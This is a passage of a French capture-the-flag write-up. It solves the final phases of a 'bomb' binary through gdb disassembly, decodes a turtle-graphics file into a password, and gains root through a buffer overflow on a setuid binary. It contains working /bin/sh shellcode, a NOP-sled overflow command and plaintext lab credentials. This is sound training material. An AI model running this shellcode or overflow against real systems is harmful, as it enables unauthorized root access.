0x08048d91 <+101>:	mov    %ebp,%esp
0x08048d93 <+103>:	pop    %ebp
0x08048d94 <+104>:	ret
End of assembler dump.
(gdb) x/6c $eax
0xbffff6f0:	115 's'	114 'r'	118 'v'	101 'e'	97 'a'	119 'w'
(gdb) x/6c 0x804980b
0x804980b:	103 'g'	105 'i'	97 'a'	110 'n'	116 't'	115 's'
```

Nous savons maintenant que notre chaîne devrait sortir de la boucle en tant que `giants` car notre string est comparé à la valeur contenu dans `0x804980b` qui se trouve être la chaîne : `giants`.

'123456' devient 'srveaw'. Il semble que la boucle soit une boucle qui chiffre la chaîne.

En observant le code de-assemblé nous pouvons voir que juste avant la boucle de vérification de _len_, le contenu d'une adresse fixe `$0x804b220` est chargé dans _$esi_.

```
(gdb) x/16c $esi
0x804b220 <array.123>:	105 'i'	115 's'	114 'r'	118 'v'	101 'e'	97 'a'	119 'w'	104 'h'
0x804b228 <array.123+8>:	111 'o'	98 'b'	112 'p'	110 'n'	117 'u'	116 't'	102 'f'	103 'g'
```

On peut également se rendre compte qu'à chaque tour de boucle un `AND 0xf` est appliqué à chacun de nos caractères passés en argument.

```
0x08048d5a <+46>:	and    $0xf,%al
```

Cela ressemble a un tableau de correspondance: un index correspond à un caractère.
Pour le vérifier éxecutons le code suivant :

```c
#include <stdio.h>

int main ()
{
	int tab[6];
	int i = 0;

	while (i < 6)
	{
		for (int a = 97; a < 123; ++a)
		{
			switch (a & 0xf)
			{
				case 15:
					tab[0] = a;
					continue;
				case 0:
					tab[1] = a;
					continue;
				case 5:
					tab[2] = a;
					continue;
				case 11:
					tab[3] = a;
					continue;
				case 13:
					tab[4] = a;
					continue;
				case 1:
					tab[5] = a;
					continue;
				default:
					continue;
			}
		}
		++i;
	}
	for (int i = 0; i < 6; ++i)
		printf("%c\n", tab[i]);
	return 0;
}
```

Cela nous donne `opukmq` et le password fonctionne. Go to étape 6.

### 6ème étape

Un petit dump de `phase_6` :

```
Dump of assembler code for function phase_6:
   0x08048d98 <+0>:	push   %ebp
   0x08048d99 <+1>:	mov    %esp,%ebp
   0x08048d9b <+3>:	sub    $0x4c,%esp
   0x08048d9e <+6>:	push   %edi
   0x08048d9f <+7>:	push   %esi
   0x08048da0 <+8>:	push   %ebx
   0x08048da1 <+9>:	mov    0x8(%ebp),%edx
   0x08048da4 <+12>:	movl   $0x804b26c,-0x34(%ebp)
   0x08048dab <+19>:	add    $0xfffffff8,%esp
   0x08048dae <+22>:	lea    -0x18(%ebp),%eax
   0x08048db1 <+25>:	push   %eax
   0x08048db2 <+26>:	push   %edx
   0x08048db3 <+27>:	call   0x8048fd8 <read_six_numbers>
   0x08048db8 <+32>:	xor    %edi,%edi
   0x08048dba <+34>:	add    $0x10,%esp
   0x08048dbd <+37>:	lea    0x0(%esi),%esi
   0x08048dc0 <+40>:	lea    -0x18(%ebp),%eax
   0x08048dc3 <+43>:	mov    (%eax,%edi,4),%eax
   0x08048dc6 <+46>:	dec    %eax
   0x08048dc7 <+47>:	cmp    $0x5,%eax
   0x08048dca <+50>:	jbe    0x8048dd1 <phase_6+57>
   0x08048dcc <+52>:	call   0x80494fc <explode_bomb>
   0x08048dd1 <+57>:	lea    0x1(%edi),%ebx
   0x08048dd4 <+60>:	cmp    $0x5,%ebx
   0x08048dd7 <+63>:	jg     0x8048dfc <phase_6+100>
   0x08048dd9 <+65>:	lea    0x0(,%edi,4),%eax
   0x08048de0 <+72>:	mov    %eax,-0x38(%ebp)
   0x08048de3 <+75>:	lea    -0x18(%ebp),%esi
   0x08048de6 <+78>:	mov    -0x38(%ebp),%edx
   0x08048de9 <+81>:	mov    (%edx,%esi,1),%eax
   0x08048dec <+84>:	cmp    (%esi,%ebx,4),%eax
   0x08048def <+87>:	jne    0x8048df6 <phase_6+94>
   0x08048df1 <+89>:	call   0x80494fc <explode_bomb>
   0x08048df6 <+94>:	inc    %ebx
   0x08048df7 <+95>:	cmp    $0x5,%ebx
   0x08048dfa <+98>:	jle    0x8048de6 <phase_6+78>
   0x08048dfc <+100>:	inc    %edi
   0x08048dfd <+101>:	cmp    $0x5,%edi
   0x08048e00 <+104>:	jle    0x8048dc0 <phase_6+40>
   0x08048e02 <+106>:	xor    %edi,%edi
   0x08048e04 <+108>:	lea    -0x18(%ebp),%ecx
   0x08048e07 <+111>:	lea    -0x30(%ebp),%eax
   0x08048e0a <+114>:	mov    %eax,-0x3c(%ebp)
   0x08048e0d <+117>:	lea    0x0(%esi),%esi
   0x08048e10 <+120>:	mov    -0x34(%ebp),%esi
   0x08048e13 <+123>:	mov    $0x1,%ebx
   0x08048e18 <+128>:	lea    0x0(,%edi,4),%eax
   0x08048e1f <+135>:	mov    %eax,%edx
   0x08048e21 <+137>:	cmp    (%eax,%ecx,1),%ebx
   0x08048e24 <+140>:	jge    0x8048e38 <phase_6+160>
   0x08048e26 <+142>:	mov    (%edx,%ecx,1),%eax
   0x08048e29 <+145>:	lea    0x0(%esi,%eiz,1),%esi
   0x08048e30 <+152>:	mov    0x8(%esi),%esi
   0x08048e33 <+155>:	inc    %ebx
   0x08048e34 <+156>:	cmp    %eax,%ebx
   0x08048e36 <+158>:	jl     0x8048e30 <phase_6+152>
   0x08048e38 <+160>:	mov    -0x3c(%ebp),%edx
   0x08048e3b <+163>:	mov    %esi,(%edx,%edi,4)
   0x08048e3e <+166>:	inc    %edi
   0x08048e3f <+167>:	cmp    $0x5,%edi
   0x08048e42 <+170>:	jle    0x8048e10 <phase_6+120>
   0x08048e44 <+172>:	mov    -0x30(%ebp),%esi
   0x08048e47 <+175>:	mov    %esi,-0x34(%ebp)
   0x08048e4a <+178>:	mov    $0x1,%edi
   0x08048e4f <+183>:	lea    -0x30(%ebp),%edx
   0x08048e52 <+186>:	mov    (%edx,%edi,4),%eax
   0x08048e55 <+189>:	mov    %eax,0x8(%esi)
   0x08048e58 <+192>:	mov    %eax,%esi
   0x08048e5a <+194>:	inc    %edi
   0x08048e5b <+195>:	cmp    $0x5,%edi
   0x08048e5e <+198>:	jle    0x8048e52 <phase_6+186>
   0x08048e60 <+200>:	movl   $0x0,0x8(%esi)
   0x08048e67 <+207>:	mov    -0x34(%ebp),%esi
   0x08048e6a <+210>:	xor    %edi,%edi
   0x08048e6c <+212>:	lea    0x0(%esi,%eiz,1),%esi
   0x08048e70 <+216>:	mov    0x8(%esi),%edx
   0x08048e73 <+219>:	mov    (%esi),%eax
   0x08048e75 <+221>:	cmp    (%edx),%eax
   0x08048e77 <+223>:	jge    0x8048e7e <phase_6+230>
   0x08048e79 <+225>:	call   0x80494fc <explode_bomb>
   0x08048e7e <+230>:	mov    0x8(%esi),%esi
   0x08048e81 <+233>:	inc    %edi
   0x08048e82 <+234>:	cmp    $0x4,%edi
   0x08048e85 <+237>:	jle    0x8048e70 <phase_6+216>
   0x08048e87 <+239>:	lea    -0x58(%ebp),%esp
   0x08048e8a <+242>:	pop    %ebx
   0x08048e8b <+243>:	pop    %esi
   0x08048e8c <+244>:	pop    %edi
   0x08048e8d <+245>:	mov    %ebp,%esp
   0x08048e8f <+247>:	pop    %ebp
   0x08048e90 <+248>:	ret
End of assembler dump.
```

C'est long, n'est-ce-pas ? Essayons de repérer quelques éléments qui nous permettent de comprendre ce qu'il se passe. D'abord, nous constatons qu'il y a un appel à `<read_six_numbers>`. Ce qui veut dire que l'input est donc de la forme de 6 _integers_ séparés par un espace. Puis nous voyons un certain nombre de boucles. La première apporte un élément intéressant : elle vérifie que chacun de nos _integers_ est unique et inférieur ou égal à `5`. Voici comment :

```
0x08048db3 <+27>:	call   0x8048fd8 <read_six_numbers> ; Renvoit l'ensemble des int stockés dans `%ebp - 0x18`
                                                        ; Nous pouvons visualiser nos inputs (ici `1 2 3 4 5 6`) :
                                                            (gdb) x /6w $ebp-0x18
                                                            0xbffff6e0:	1	2	3	4
                                                            0xbffff6f0:	5	6
0x08048db8 <+32>:	xor    %edi,%edi                    ; %edi = i == 0
0x08048dba <+34>:	add    $0x10,%esp
0x08048dbd <+37>:	lea    0x0(%esi),%esi
0x08048dc0 <+40>:	lea    -0x18(%ebp),%eax
0x08048dc3 <+43>:	mov    (%eax,%edi,4),%eax
0x08048dc6 <+46>:	dec    %eax
0x08048dc7 <+47>:	cmp    $0x5,%eax
0x08048dca <+50>:	jbe    0x8048dd1 <phase_6+57>       ; if %eax <= 5: jump
0x08048dcc <+52>:	call   0x80494fc <explode_bomb>     ; else: boum !
0x08048dd1 <+57>:	lea    0x1(%edi),%ebx               ; %ebx = j == i + 1
0x08048dd4 <+60>:	cmp    $0x5,%ebx
0x08048dd7 <+63>:	jg     0x8048dfc <phase_6+100>      ; if j > 5: jump
0x08048dd9 <+65>:	lea    0x0(,%edi,4),%eax
0x08048de0 <+72>:	mov    %eax,-0x38(%ebp)
0x08048de3 <+75>:	lea    -0x18(%ebp),%esi
0x08048de6 <+78>:	mov    -0x38(%ebp),%edx
0x08048de9 <+81>:	mov    (%edx,%esi,1),%eax
0x08048dec <+84>:	cmp    (%esi,%ebx,4),%eax
0x08048def <+87>:	jne    0x8048df6 <phase_6+94>       ; if valeur[j] != valeur[i]: jump
0x08048df1 <+89>:	call   0x80494fc <explode_bomb>     ; else: boum!
0x08048df6 <+94>:	inc    %ebx                         ; j++
0x08048df7 <+95>:	cmp    $0x5,%ebx
0x08048dfa <+98>:	jle    0x8048de6 <phase_6+78>       ; j <= 5: loop
0x08048dfc <+100>:	inc    %edi                         ; i++
0x08048dfd <+101>:	cmp    $0x5,%edi
0x08048e00 <+104>:	jle    0x8048dc0 <phase_6+40>       ; i <= 5: loop
```

Nous savons donc que chacun des numéros est unique et inférieur ou égal à `5`. À partir de là nous pourrions générer tous les mots de passe et les tester un à un... C'est possible. Mais l'étude un peu plus prolongé du code nous apporte quelques éléments de réponses qui vont nous permettre d'en déduire l'ordre.

Nous pouvons voir que le code est une succession de boucles. Il semble y avoir 3 grandes parties qui suivent :

- la première crée une liste chaînée,
- la seconde ré-arrange les maillons dans l'ordre donné par l'input,
- la dernière vérifie cet ordre en regardant si les valeurs sont stockées dans l'ordre décroissant.

En explorant un peu nous trouvons :

```
(gdb) x/3x $esi
0x804b230 <node6>:	0x000001b0	0x00000006	0x0804b23c
(gdb) x/3x *($esi + 8)
0x804b23c <node5>:	0x000000d4	0x00000005	0x0804b248
(gdb) x/3x *(*($esi + 8) + 8)
0x804b248 <node4>:	0x000003e5	0x00000004	0x0804b254
(gdb) x/3x *(*(*($esi + 8) + 8) + 8)
0x804b254 <node3>:	0x0000012d	0x00000003	0x0804b260
(gdb) x/3x *(*(*(*($esi + 8) + 8) + 8) + 8)
0x804b260 <node2>:	0x000002d5	0x00000002	0x0804b26c
(gdb) x/3x *(*(*(*(*($esi + 8) + 8) + 8) + 8) + 8)
0x804b26c <node1>:	0x000000fd	0x00000001	0x00000000
```

Nous avons une liste chaînée contenant des structures sûrement de la forme :

```C
struct      list
{
    int     value;
    int     index;
    list    *next;
};
```

Nous voyons 6 _nodes_ :

> Dans cette exemple nous avons utilisé l'_input_ : `6 5 4 3 2 1`.

node | value | index | next
---|---|---|---|
1 | 0x000000fd | 1 | NULL
2 | 0x000002d5 | 2 | 0x0804b26c
3 | 0x0000012d | 3 | 0x0804b260
4 | 0x000003e5 | 4 | 0x0804b254
5 | 0x000000d4 | 5 | 0x0804b248
6 | 0x000001b0 | 6 | 0x0804b23c

Et comme la dernière partie classe les maillons par ordre décroissant selon le champ _value_ nous avons :

node | value | index |
---|---|---|---
4 | 0x000003e5 | 4 
2 | 0x000002d5 | 2 
6 | 0x000001b0 | 6 
3 | 0x0000012d | 3 
1 | 0x000000fd | 1 
5 | 0x000000d4 | 5 

Nous en concluons que le mot de passe final est : `4 2 6 3 1 5`.

Bravo ! Nous pouvons nous connecter en ssh avec le login : `thor` et le password : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

## turtle

Un fichier `turtle` va nous permettre d'obtenir le mot de passe pour accéder à la session de `zaz`.

Ce fichier contient des instructions de déplacement. Les utilisateurs de Python reconnaîtront les méthodes de la bibliothèque [Turtle](https://docs.python.org/3.0/library/turtle.html). En nettoyant le fichier et en appliquant le script `turtle.py` que nous avons créé, vous obtenez une inscription : `SLASH`.

En hashant ce résultat, nous obtenons : `646da671ca01bb5d84dbb5fb2238dc8e` pour le mot de passe de `zaz`.

## exploit_me

Un exécutable `exploit_me` est présent à la racine. Nous allons utiliser la technique du _buffer overflow_ pour cette partie car le _owner_ est _root_.

Rentrez directement dans le shell :

```bash
$> export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
```

Ce qui correspond à l'ouverture d'un shell en `shellcode`.

Le programme suivant est à copier/coller, à compiler et exécuter. Il renvoit l'adresse à laquelle se trouve la variable d'environnement `SHELLCODE` (que nous avons donc modifié précédemment).

```C
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
    char* ptr = getenv("SHELLCODE");
    printf("%p\n", ptr);
}
```

> Le fichier est aussi disponible dans `scripts/ressources/buffer_overflow.c`.

Nous pouvons exécuter la ligne suivante qui va démarrer le fichier `exploit_me` où `SHELLCODE` est l'adresse de la variable d'environnement `$SHELLCODE` en inversant l'endian (par exemple `0xbffff8f8` devient `\xf8\xf8\xff\xbf`).

```bash
./exploit_me `python -c 'print "\x90" * 140 + "SHELLCODE"'`
```

Nous écrivons donc `\x90` sur 140 octets (qui correspond à un `NOP`, cela passe à l'octet suivant) puis nous passons au `shellcode`.

> Le programme va lire le shellcode et ouvrir un nouveau shell en root car l'user qui a crée `./exploit_me` est `root`.

__Bravo ! Vous êtes root !__
